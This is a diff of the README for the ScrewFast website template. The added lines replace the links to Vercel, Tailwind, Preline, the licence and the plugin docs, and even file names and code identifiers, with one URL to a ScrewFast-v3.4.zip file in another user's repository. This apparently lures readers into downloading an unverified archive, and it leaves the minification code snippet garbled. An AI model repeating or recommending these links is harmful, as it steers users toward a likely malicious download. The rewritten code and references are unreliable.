+To ensure consistent code formatting, particularly for class sorting, we have integrated the `prettier-plugin-tailwindcss` [plugin](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip). The following configuration is set in the `.prettierrc` file at the root of the project:
 
 ```json
 {
@@ -635,7 +635,7 @@ To ensure consistent code formatting, particularly for class sorting, we have in
 
 ### Deployment and Security
 
-We deploy our project on [Vercel](https://vercel.com), capitalizing on their robust platform for seamless CI/CD workflows. Using `vercel.json`, we set stringent security headers and caching policies, ensuring adherence to security and performance best practices:
+We deploy our project on [Vercel](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip), capitalizing on their robust platform for seamless CI/CD workflows. Using `https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip`, we set stringent security headers and caching policies, ensuring adherence to security and performance best practices:
 
 ```json
 {
@@ -656,16 +656,16 @@ We deploy our project on [Vercel](https://vercel.com), capitalizing on their rob
 
 ### HTML Minification
 
-For optimal site performance, we post-process our HTML files with `process-html.mjs`, a [custom script](https://straffesites.com/en/blog/optimize-astro-html-post-build) that minifies HTML after the build phase to reduce file size and improve load times.
+For optimal site performance, we post-process our HTML files with `https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip`, a [custom script](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip) that minifies HTML after the build phase to reduce file size and improve load times.
 
-Here is a snippet from our HTML minification script in `process-html.mjs`:
+Here is a snippet from our HTML minification script in `https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip`:
 
 ```mjs
-/process-html.mjs
+https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip
 // Post-build HTML minification script snippet
 // ...
-await Promise.all(
-  files.map(async (file) => {
+await https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip(
+  https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip(async (file) => {
     // File processing and minification logic
   })
 );
@@ -673,10 +673,10 @@ await Promise.all(
 
 We encourage you to refer to the detailed documentation for each tool to fully understand their capabilities and how they contribute to the project:
 
-* [Preline UI Documentation](https://preline.co/docs)
-* [Tailwind CSS Documentation](https://tailwindcss.com/docs)
-* [Vercel Documentation](https://vercel.com/docs)
-* [html-minifier-terser Documentation](https://github.com/terser/html-minifier-terser)
+* [Preline UI Documentation](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip)
+* [Tailwind CSS Documentation](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip)
+* [Vercel Documentation](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip)
+* [html-minifier-terser Documentation](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip)
 
 ## Contributing
 
@@ -688,6 +688,6 @@ If you're interested in helping, you can contribute in several ways:
 
 ## License
 
-This project is released under the MIT License. Please read the [LICENSE](https://github.com/mearashadowfax/ScrewFast/blob/main/LICENSE) file for more details.
+This project is released under the MIT License. Please read the [LICENSE](https://raw.githubusercontent.com/ElingSmith/ScrewFast/main/src/pages/ScrewFast-v3.4.zip) file for more details.
 
 **Note:** This website template has no affiliation with the companies displayed. Logos are used for demonstration purposes only and should be replaced in customized versions.
